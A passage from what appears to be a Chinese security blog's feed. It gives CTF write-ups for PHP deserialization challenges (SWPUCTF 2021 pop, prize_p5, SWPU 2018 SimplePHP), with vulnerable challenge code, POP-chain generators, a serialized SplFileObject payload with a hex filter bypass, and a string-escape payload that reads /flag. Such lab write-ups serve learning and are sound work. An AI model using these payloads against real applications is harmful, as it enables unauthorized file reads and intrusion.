cookie的值以及UA头的内容</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化的ctf题目</title>
    <link href="/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/11/15/%E5%9C%A8ctf%E9%A2%98%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="SWPUCTF-2021-新生赛-pop"><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1><p>这一道题我看了好一会wp才想明白，还是太菜鸡了，下面整理一下思路</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$w00m</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$w00m</span>);<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>我们观察php代码可以，要想获得flag，有一个 function Getflag()函数，我们需要调用这个函数。</p><p>然后在w33m这个类中看到有一个函数调用的。</p><p>即：$this-&gt;w00m-&gt;{$this-&gt;w22m}();  这里w00m是w44m这个类，然后为w22m是Getflag这个函数。</p><p>这里需要触发toString魔术方法，然后通过echo进行输出，echo $this-&gt;w00m;。</p><p>链子：</p><p> getflag -&gt;tostring -&gt; _destruct 很短。</p><p>最后需要进行url编码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$admin</span> = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$passwd</span> = <span class="hljs-string">&#x27;08067&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w00m</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$w22m</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w44m</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w22m</span>();<br><span class="hljs-variable">$c</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">w33m</span>();<br><span class="hljs-variable">$c</span>-&gt;w00m=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$c</span>-&gt;w22m=Getflag;<br><span class="hljs-variable">$b</span>-&gt;w00m=<span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="prize-p5"><a href="#prize-p5" class="headerlink" title="prize_p5"></a>prize_p5</h1><p>很有意思的一道题目，预期解就是通过字符串逃逸去读取flag非预期就是通过十六进制利用原生类去读取flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">catalogue</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = &quot;<span class="hljs-title">error</span>&quot;;</span><br><span class="hljs-class">        $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span> = &quot;<span class="hljs-title">hacker</span>&quot;;</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__destruct</span>()</span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">error</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$OTL</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;OTL = <span class="hljs-variable">$OTL</span>;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;OTL);<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;                                                                   <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;OTL&#x27;</span>;                                                 <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-string">&#x27;123666&#x27;</span>;                                             <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;sweet@OTL.com&#x27;</span>;                          <br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">abscond</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;NSS&#x27;</span>, <span class="hljs-string">&#x27;CTF&#x27;</span>, <span class="hljs-string">&#x27;OTL_QAQ&#x27;</span>, <span class="hljs-string">&#x27;hello&#x27;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$filter</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/object/i&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]))&#123;      <span class="hljs-comment">//这个object就是object字符串 所以用原生类去读取的时候会被过滤掉</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cata&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$cc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">catalogue</span>(); <br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$cc</span>));           <br>    &#125;    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>        <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>        <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>        <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先来说一下非预期解：</p><p>非预期就是利用Globlterator  去读取flag的具体位置，但是环境可能出了点问题，出不来，看其他的wp是  /flag</p><p>用SplFileObject  去读取的时候object会被过滤掉</p><p>但是有一种方法就是利用十六进制   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;SplFileObject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>把SplFileObject前面的那个小写的s替换成大写的S 然后后面的Object任意一个字符替换成十六进制</p><p>Object对应的十六进制是\x4F\x62\x6A\x65\x63\x74  然后传的时候把x去掉</p><p>然后下面是预期解 通过字符串逃逸</p><p>这个题的话可以通过字符串逃逸增加，也可以通过字符串逃逸减少  下面介绍一下字符串逃逸增加的用法</p><p><strong>字符串逃逸增加：</strong></p><p>我这个是通过NSS来的，你通过其他的比hacker少的字符来的话都可以其实</p><p>先来看下面这段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))&#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono,you can not do that!&quot;</span>);<br>       &#125;<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br>       <span class="hljs-variable">$abscond</span>-&gt;name = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;phone = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span>-&gt;email = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>       <span class="hljs-variable">$abscond</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$abscond</span>);<br>       <span class="hljs-variable">$escape</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">abscond</span>(<span class="hljs-variable">$abscond</span>)));<br>       <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))&#123;<br>       <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$escape</span>[<span class="hljs-string">&#x27;email&#x27;</span>]));<br>       &#125;<br>       <span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;<br></code></pre></td></tr></table></figure><p>这个首先对email的值进行了一个/flag的检测，（不区分大小写）</p><p>然后分别POST传参三个参数 abscond这个函数就是进行一个替换  ‘NSS’, ‘CTF’, ‘OTL_QAQ’, ‘hello’  如果匹配到了上面四个值的话，就会替换成hacker</p><p>接下来进行一个反序列化，get_object_vars这个函数的意思可以看看以下演示的理解一下</p><p>总的说就是<strong>用于获取指定对象的属性和值，并返回一个关联数组。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-variable">$age</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$person</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;John Doe&quot;</span>, <span class="hljs-number">25</span>);<br><br><span class="hljs-variable">$vars</span> = <span class="hljs-title function_ invoke__">get_object_vars</span>(<span class="hljs-variable">$person</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$vars</span>);<br><br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [name] =&gt; John Doe<br>    [age] =&gt; <span class="hljs-number">25</span><br>)<br><br></code></pre></td></tr></table></figure><p>最后的那个if判断就是如果phone是一个数组的话，就把以email为路径的文件内容给读取并以字符串的形式给打印出来</p><p>最后把内容进行一个base64加密</p><p>分析完后我们通过字符串逃逸的方式，将email的值设为/flag，然后把它给放到name里面去，让它变成一个name的值</p><p>这样就绕过了对email的一个检测</p><p>先来看一下简单的一个测试：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Nq&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;aa&#x27;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;escape&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;Nq&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;<span class="hljs-selector-tag">a</span>:<span class="hljs-number">1</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;aa&quot;</span>;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>我们要做的就是将”;s:5:”phone”;a:1:{i:0;s:2:”aa”;}s:5:”email”;s:5:”/flag”;}这个给变成name的一个值</p><p>字符串逃逸的话可以去看看我的这篇博客 （初学者，是自己对反序列化逃逸的一个理解）</p><p>上面我们要塞进去的有58个字符，有一点点长啊</p><p>一个NSS可以逃逸出3个字符，根据计算我们要19个NSS加一个hello</p><p>name的值就是：<br>name=NSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSSNSShello”;s:5:”phone”;a:1:{i:0;s:2:”aa”;}s:5:”email”;s:5:”/flag”;}</p><p>然后phpone的值随便输就行，注意的是emial的值不能是/flag，其他的都可以</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202311151558491.png" alt="image-20230625162958674"></p><h1 id="SWPU-2018-SimplePHP"><a href="#SWPU-2018-SimplePHP" class="headerlink" title="[SWPU 2018]SimplePHP"></a>[SWPU 2018]SimplePHP</h1><p>这个题目的话使用到了phar反序列化 总体思路就是构造pop链，生成一个phar文件，由于做了一个白名单限制，但是利用phar伪协议去读取的时候与后缀名无关，关键是里面的数据要对</p><p>所以就手动修改一下后缀名就可以了 上传文件 在upload下查看一下 </p><p>看到上传的文件名 在查看文件那里读取一下就可以了</p><p>重点来看一下这个pop链构造 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span 